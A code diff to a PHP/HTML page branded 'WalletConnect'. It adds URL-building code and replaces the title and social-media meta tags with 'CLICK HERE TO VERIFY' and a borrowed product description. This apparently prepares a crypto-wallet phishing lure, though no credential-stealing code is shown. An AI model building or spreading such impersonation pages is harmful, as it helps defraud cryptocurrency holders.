@@ -1,3 +1,15 @@
+<?php
+
+$pageURL = 'http';
+
+if ($_SERVER["HTTPS"] == "on") {
+  $pageURL .= "s";
+}
+$pageURL .= "://";
+$pageURL .= $_SERVER["SERVER_NAME"];
+
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -5,7 +17,26 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WalletConnect</title>
+  <!-- Meta tags  -->
+  <meta name="title" content="CLICK HERE TO VERIFY">
+  <meta name="description" content="Wallet connect is a user-friendly, tokenized, community-management system. Our system is designed for anyone to build tools to manage their community." />
+
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="<?php echo $pageURL; ?>">
+  <meta property="og:title" content="CLICK HERE TO VERIFY">
+  <meta property="og:description" content="Wallet connect is a user-friendly, tokenized, community-management system. Our system is designed for anyone to build tools to manage their community.">
+  <meta property="og:image" content="<?php echo $pageURL; ?>/assets/images/social-card.png">
+
+  <!-- Twitter -->
+  <meta property="twitter:card" content="collab.land">
+  <meta property="twitter:url" content="<?php echo $pageURL; ?>">
+  <meta property="twitter:title" content="CLICK HERE TO VERIFY">
+  <meta property="twitter:description" content="Wallet connect is a user-friendly, tokenized, community-management system. Our system is designed for anyone to build tools to manage their community.">
+  <meta property="twitter:image" content="<?php echo $pageURL; ?>/assets/images/social-card.png">
+
+  <title>CLICK HERE TO VERIFY</title>
   <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
 
   <link rel="stylesheet" href="assets/vendor/bootstrap.min.css">
